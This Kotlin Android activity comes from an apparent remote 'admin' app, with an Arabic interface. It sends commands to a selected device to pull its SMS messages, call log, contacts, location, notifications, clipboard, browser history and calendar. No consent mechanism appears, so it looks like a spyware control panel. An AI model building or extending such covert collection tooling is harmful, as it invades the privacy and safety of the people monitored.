package com.abuzahra.admin.ui.data

import android.os.Bundle
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.abuzahra.admin.data.api.SendCommandRequest
import com.abuzahra.admin.databinding.ActivityDataBinding
import com.abuzahra.admin.util.Preferences
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import kotlinx.coroutines.launch

class DataActivity : AppCompatActivity() {

    private lateinit var binding: ActivityDataBinding
    private var selectedDeviceId: String = ""
    private var selectedDeviceName: String = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityDataBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setupToolbar()
        loadDataButtons()
    }

    private fun setupToolbar() {
        setSupportActionBar(binding.toolbar)
        supportActionBar?.title = "البيانات"
        supportActionBar?.setDisplayHomeAsUpEnabled(true)
        binding.toolbar.setNavigationOnClickListener { finish() }
    }

    private fun loadDataButtons() {
        val dataButtons = listOf(
            Triple(binding.btnSms, "get_sms", "الرسائل القصيرة"),
            Triple(binding.btnCalls, "get_call_log", "سجل المكالمات"),
            Triple(binding.btnContacts, "get_contacts", "جهات الاتصال"),
            Triple(binding.btnLocation, "get_location", "الموقع الحالي"),
            Triple(binding.btnNotifications, "get_notifications", "الإشعارات"),
            Triple(binding.btnClipboard, "get_clipboard", "الحافظة"),
            Triple(binding.btnBattery, "get_battery_info", "البطارية"),
            Triple(binding.btnDeviceInfo, "get_device_info", "معلومات الجهاز"),
            Triple(binding.btnWifi, "get_wifi_networks", "شبكات Wi-Fi"),
            Triple(binding.btnApps, "get_installed_apps", "التطبيقات المثبتة"),
            Triple(binding.btnBrowser, "get_browser_history", "سجل المتصفح"),
            Triple(binding.btnCalendar, "get_calendar", "التقويم")
        )

        // Load devices to select
        lifecycleScope.launch {
            try {
                val api = Preferences.getInstance(this@DataActivity).getApiService()
                val devices = api.getDevices()
                if (devices.isNotEmpty()) {
                    val firstOnline = devices.firstOrNull { it.isOnline } ?: devices.first()
                    selectedDeviceId = firstOnline.id
                    selectedDeviceName = firstOnline.name.ifEmpty { firstOnline.model }
                    binding.tvSelectedDevice.text = "الجهاز: $selectedDeviceName"

                    // Show device selector
                    binding.tvSelectedDevice.setOnClickListener {
                        val names = devices.map { it.name.ifEmpty { it.model } }
                        MaterialAlertDialogBuilder(this@DataActivity)
                            .setTitle("اختر جهازاً")
                            .setItems(names.toTypedArray()) { _, which ->
                                selectedDeviceId = devices[which].id
                                selectedDeviceName = names[which]
                                binding.tvSelectedDevice.text = "الجهاز: $selectedDeviceName"
                            }
                            .show()
                    }
                } else {
                    binding.tvSelectedDevice.text = "لا توجد أجهزة متصلة"
                }
            } catch (_: Exception) {}
        }

        dataButtons.forEach { (button, command, name) ->
            button.setOnClickListener {
                if (selectedDeviceId.isBlank()) {
                    MaterialAlertDialogBuilder(this)
                        .setTitle("خطأ")
                        .setMessage("لا يوجد جهاز محدد")
                        .setPositiveButton("حسناً", null)
                        .show()
                    return@setOnClickListener
                }
                sendDataCommand(command, name)
            }
        }
    }

    private fun sendDataCommand(command: String, name: String) {
        lifecycleScope.launch {
            try {
                val api = Preferences.getInstance(this@DataActivity).getApiService()
                val response = api.sendCommand(selectedDeviceId, SendCommandRequest(command))
                MaterialAlertDialogBuilder(this@DataActivity)
                    .setTitle(name)
                    .setMessage(if (response.ok) "تم إرسال الطلب بنجاح. سيتم تحديث البيانات قريباً." else "فشل: ${response.message}")
                    .setPositiveButton("حسناً", null)
                    .show()
            } catch (e: Exception) {
                MaterialAlertDialogBuilder(this@DataActivity)
                    .setTitle("خطأ")
                    .setMessage("${e.message}")
                    .setPositiveButton("حسناً", null)
                    .show()
            }
        }
    }
}